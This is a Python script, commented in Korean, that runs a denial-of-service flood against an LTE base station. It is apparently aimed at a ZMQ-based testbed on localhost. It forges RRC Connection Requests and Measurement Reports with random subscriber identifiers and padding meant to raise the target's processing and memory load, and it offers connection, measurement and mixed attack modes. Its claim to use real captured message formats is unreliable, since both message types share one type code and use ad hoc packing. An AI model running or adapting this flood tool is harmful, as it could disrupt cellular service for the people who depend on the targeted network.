#!/usr/bin/env python3
"""
실제 UE RRC 메시지 형식을 사용한 공격
캡처된 실제 RRC 메시지를 기반으로 공격 수행
"""

import zmq
import struct
import time
import random
import threading
from datetime import datetime

class RealRRCAttack:
    def __init__(self, target_port=2000):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        
    def create_real_rrc_connection_request(self, ue_id):
        """실제 UE 형식의 RRC Connection Request 생성"""
        # 실제 캡처된 메시지 형식 사용
        message = struct.pack('>H', 0x014E)  # 실제 RRC 메시지 타입
        message += struct.pack('>I', ue_id)   # UE Identity
        message += struct.pack('>H', 0x0001)  # Establishment Cause
        message += struct.pack('>H', 0x0000)  # Spare
        
        # 실제 UE가 보내는 추가 정보
        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
        message += struct.pack('>H', random.randint(1, 65535))  # LAI
        message += struct.pack('>B', 0x01)  # RRC State: IDLE
        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
        message += struct.pack('>H', random.randint(1, 65535))  # Tracking Area Code
        
        # 더 큰 페이로드 추가 (처리 부담 증가)
        message += b'\x00' * 100  # 100바이트 추가
        
        return message
    
    def create_real_measurement_report(self, ue_id):
        """실제 UE 형식의 RRC Measurement Report 생성"""
        # 실제 캡처된 메시지 형식 사용
        message = struct.pack('>H', 0x014E)  # 실제 RRC 메시지 타입
        message += struct.pack('>I', ue_id)   # UE Identity
        
        # 다수의 측정값 포함 (스케줄링 알고리즘 부담 증가)
        for i in range(50):  # 50개 셀 측정값
            message += struct.pack('>H', random.randint(1, 65535))  # Cell ID
            message += struct.pack('>B', random.randint(50, 120))   # RSRP
            message += struct.pack('>B', random.randint(0, 20))      # RSRQ
            message += struct.pack('>B', random.randint(0, 100))    # SINR
        
        # 더 큰 페이로드 추가 (메모리 사용량 증가)
        message += b'Y' * 2000  # 2KB 페이로드
        
        return message
    
    def send_real_rrc_message(self, message, message_type="Unknown"):
        """실제 RRC 메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            socket.send(message, zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
            print(f"  메시지 크기: {len(message)} bytes")
            print(f"  데이터: {message.hex()[:20]}...")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
            return False
    
    def rrc_connection_flood(self, duration=60):
        """RRC Connection Request 플러딩"""
        print(f"=== RRC Connection Request 플러딩 시작 ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            ue_id = random.randint(1000, 9999)
            message = self.create_real_rrc_connection_request(ue_id)
            
            if self.send_real_rrc_message(message, f"RRC Connection Request #{count+1}"):
                count += 1
            
            time.sleep(0.1)  # 100ms 간격
        
        print(f"\n=== 플러딩 완료 ===")
        print(f"총 {count}개 메시지 전송")
    
    def measurement_report_flood(self, duration=60):
        """RRC Measurement Report 플러딩"""
        print(f"=== RRC Measurement Report 플러딩 시작 ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            ue_id = random.randint(1000, 9999)
            message = self.create_real_measurement_report(ue_id)
            
            if self.send_real_rrc_message(message, f"RRC Measurement Report #{count+1}"):
                count += 1
            
            time.sleep(0.05)  # 50ms 간격
        
        print(f"\n=== 플러딩 완료 ===")
        print(f"총 {count}개 메시지 전송")
    
    def mixed_attack(self, duration=60):
        """혼합 공격 (Connection Request + Measurement Report)"""
        print(f"=== 혼합 RRC 공격 시작 ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            ue_id = random.randint(1000, 9999)
            
            # 50% 확률로 Connection Request 또는 Measurement Report
            if random.random() < 0.5:
                message = self.create_real_rrc_connection_request(ue_id)
                msg_type = "RRC Connection Request"
            else:
                message = self.create_real_measurement_report(ue_id)
                msg_type = "RRC Measurement Report"
            
            if self.send_real_rrc_message(message, f"{msg_type} #{count+1}"):
                count += 1
            
            time.sleep(0.05)  # 50ms 간격
        
        print(f"\n=== 혼합 공격 완료 ===")
        print(f"총 {count}개 메시지 전송")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='실제 UE RRC 메시지 형식을 사용한 공격')
    parser.add_argument('--target-port', type=int, default=2000, help='eNB 포트 (기본값: 2000)')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--attack-type', choices=['connection', 'measurement', 'mixed'], 
                       default='mixed', help='공격 유형')
    
    args = parser.parse_args()
    
    attacker = RealRRCAttack(args.target_port)
    
    try:
        if args.attack_type == 'connection':
            attacker.rrc_connection_flood(args.duration)
        elif args.attack_type == 'measurement':
            attacker.measurement_report_flood(args.duration)
        else:
            attacker.mixed_attack(args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attacker.running = False

if __name__ == "__main__":
    main()
